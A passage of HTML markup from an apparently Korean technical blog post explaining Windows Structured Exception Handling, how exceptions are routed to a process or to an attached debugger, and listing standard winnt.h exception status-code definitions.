0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SEH (Structured Exception Handler)</h1>\n<ul>\n<li>SEH Windows 운영체제에서 제공하는 예외처리 시스템이다.</li>\n<li><code class=\"language-text\">__try, __except, __finally</code> 키워드로 간단히 구현할 수 있다.</li>\n<li>하드웨어 오류와 같은 특정 예외 코드 상황을 정상적으로 처리하기 위해 C에 대한 Microsoft 확장이다.</li>\n<li>SEH를 사용하면 실행이 예기치 않게 종료 되는 경우 메모리 블록 및 파일과 같은 리소스가 올바르게 해제 되도록 할 수 있다.</li>\n</ul>\n<h3 id=\"seh-매커니즘\" style=\"position:relative;\"><a href=\"#seh-%EB%A7%A4%EC%BB%A4%EB%8B%88%EC%A6%98\" aria-label=\"seh 매커니즘 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SEH 매커니즘</h3>\n<ul>\n<li>예외 처리기 , <code class=\"language-text\">_except</code> 예외에 응답 하거나 해제할 수 있는 블록</li>\n<li>Termination Handlers <code class=\"language-text\">_finally</code> 예외가 종료를 발생 시키는 지 여부에 관계 없이 항상 호출되는 종료 처리기 또는 블록</li>\n</ul>\n<h3 id=\"일반-실행의-경우-예외-처리-방법\" style=\"position:relative;\"><a href=\"#%EC%9D%BC%EB%B0%98-%EC%8B%A4%ED%96%89%EC%9D%98-%EA%B2%BD%EC%9A%B0-%EC%98%88%EC%99%B8-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EB%B2%95\" aria-label=\"일반 실행의 경우 예외 처리 방법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>일반 실행의 경우 예외 처리 방법</h3>\n<ul>\n<li>OS는 프로세스 실행 중에 예외가 발생하면 프로세스에게 처리를 맡긴다.</li>\n<li>프로세스 코드에 (SEH…) 예외처 리가 구현되어 있다면, 해당 예외를 잘 처리한 후 게속 실행될 것이다.</li>\n<li>구현되어 있지 않다면 기본 예외 처리기를 동작시켜 프로세스를 종료 시킨다.</li>\n</ul>\n<h3 id=\"디버깅-실행의-경우-예외-처리-방법\" style=\"position:relative;\"><a href=\"#%EB%94%94%EB%B2%84%EA%B9%85-%EC%8B%A4%ED%96%89%EC%9D%98-%EA%B2%BD%EC%9A%B0-%EC%98%88%EC%99%B8-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EB%B2%95\" aria-label=\"디버깅 실행의 경우 예외 처리 방법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>디버깅 실행의 경우 예외 처리 방법</h3>\n<ul>\n<li>디버깅 중에 디버기 프로세스에 에외가 발생하면 OS는 우선적으로 디버거에게 에외를 넘겨서 처리하도록 한다.</li>\n<li>디버거는 디버기에 대한 거의 모든 소유권을 가지고 있다.</li>\n<li>즉 디버기의 실행, 종료의 제어뿐만 아니라 디버기 프로세스 내부의 가상 메모리, 레지스터에 때한 읽기/쓰기 권한도 가지고 있다.</li>\n<li>이버기의 내부에서 발생하는 모든 에외(에러) 상황을 처리해야 한다.</li>\n<li>디버기의 SEH는 우선순위에서 디버거에게 밀린다.</li>\n</ul>\n<h3 id=\"디버거-실행-중지시-조치\" style=\"position:relative;\"><a href=\"#%EB%94%94%EB%B2%84%EA%B1%B0-%EC%8B%A4%ED%96%89-%EC%A4%91%EC%A7%80%EC%8B%9C-%EC%A1%B0%EC%B9%98\" aria-label=\"디버거 실행 중지시 조치 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>디버거 실행 중지시 조치</h3>\n<ol>\n<li>\n<p>예외 직접 수정 : 코드, 레지스터, 메모리</p>\n<ul>\n<li>디버거는 예외가 발생한 코드 주소에 멈춰 있기 때문에 문제가 발생한 코드, 메모리, 레지스터 등을 디버거를 통하여 직접 수정하면 예외는 해결된다.</li>\n</ul>\n</li>\n<li>\n<p>예외를 디버기에게 넘겨서 처리</p>\n<ul>\n<li>디버기 내부에 이미 SEH가 존재하여 예외를 처리할 수 있다.</li>\n<li>예외 (EXCEPTION) 통지를 그대로 디버기에게 되돌려 보내서 자체 해결하도록 만들 수 있다.</li>\n<li>‘일반 실행’ 의 예외 처리와 동일한 상황이 된다.</li>\n</ul>\n</li>\n<li>\n<p>기본 예외처리기</p>\n<ul>\n<li>현재 발생한 예외를 디버거와 디버기에서 처리할 수 없다면 (혹은 의도적으로 처리하지 않는다면), 마지막으로 OS의 기본 예외 처리기에서 처리한다.</li>\n<li>디버기 프로세스가 종료되면서 디버깅은 완전히 중지된다.</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"excpetion\" style=\"position:relative;\"><a href=\"#excpetion\" aria-label=\"excpetion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Excpetion</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifndef</span> <span class=\"token expression\">UMDF_USING_NTSTATUS </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifndef</span> <span class=\"token expression\">WIN32_NO_STATUS </span></span>\n<span class=\"token comment\">/*lint -save -e767 */</span>  \n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_WAIT_0</span>                           <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x00000000L</span><span class=\"token punctuation\">)</span> </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ABANDONED_WAIT_0</span>          <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x00000080L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_USER_APC</span>                  <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x000000C0L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_TIMEOUT</span>                   <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x00000102L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_PENDING</span>                   <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x00000103L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_EXCEPTION_HANDLED</span>            <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x00010001L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_CONTINUE</span>                     <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x00010002L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_SEGMENT_NOTIFICATION</span>      <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40000005L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FATAL_APP_EXIT</span>            <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40000015L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_REPLY_LATER</span>                  <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40010001L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_TERMINATE_THREAD</span>             <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40010003L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_TERMINATE_PROCESS</span>            <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40010004L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_CONTROL_C</span>                    <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40010005L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_PRINTEXCEPTION_C</span>             <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40010006L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_RIPEXCEPTION</span>                 <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40010007L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_CONTROL_BREAK</span>                <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40010008L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_COMMAND_EXCEPTION</span>            <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40010009L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_PRINTEXCEPTION_WIDE_C</span>        <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x4001000AL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_GUARD_PAGE_VIOLATION</span>      <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x80000001L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_DATATYPE_MISALIGNMENT</span>     <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x80000002L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_BREAKPOINT</span>                <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x80000003L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_SINGLE_STEP</span>               <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x80000004L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_LONGJUMP</span>                  <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x80000026L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_UNWIND_CONSOLIDATE</span>        <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x80000029L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_EXCEPTION_NOT_HANDLED</span>        <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x80010001L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ACCESS_VIOLATION</span>          <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000005L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_IN_PAGE_ERROR</span>             <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000006L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_INVALID_HANDLE</span>            <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000008L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_INVALID_PARAMETER</span>         <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC000000DL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_NO_MEMORY</span>                 <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000017L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ILLEGAL_INSTRUCTION</span>       <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC000001DL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_NONCONTINUABLE_EXCEPTION</span>  <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000025L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_INVALID_DISPOSITION</span>       <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000026L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ARRAY_BOUNDS_EXCEEDED</span>     <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC000008CL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_DENORMAL_OPERAND</span>    <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC000008DL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_DIVIDE_BY_ZERO</span>      <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC000008EL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_INEXACT_RESULT</span>      <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC000008FL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_INVALID_OPERATION</span>   <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000090L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_OVERFLOW</span>            <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000091L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_STACK_CHECK</span>         <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000092L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_UNDERFLOW</span>           <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000093L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_INTEGER_DIVIDE_BY_ZERO</span>    <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000094L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_INTEGER_OVERFLOW</span>          <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000095L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_PRIVILEGED_INSTRUCTION</span>    <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000096L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_STACK_OVERFLOW</span>            <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC00000FDL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_DLL_NOT_FOUND</span>             <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000135L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ORDINAL_NOT_FOUND</span>         <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000138L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ENTRYPOINT_NOT_FOUND</span>      <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000139L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_CONTROL_C_EXIT</span>            <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC000013AL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_DLL_INIT_FAILED</span>           <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000142L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_MULTIPLE_FAULTS</span>     <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC00002B4L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_MULTIPLE_TRAPS</span>      <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC00002B5L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_REG_NAT_CONSUMPTION</span>       <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC00002C9L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_HEAP_CORRUPTION</span>           <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000374L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_STACK_BUFFER_OVERRUN</span>      <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000409L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token 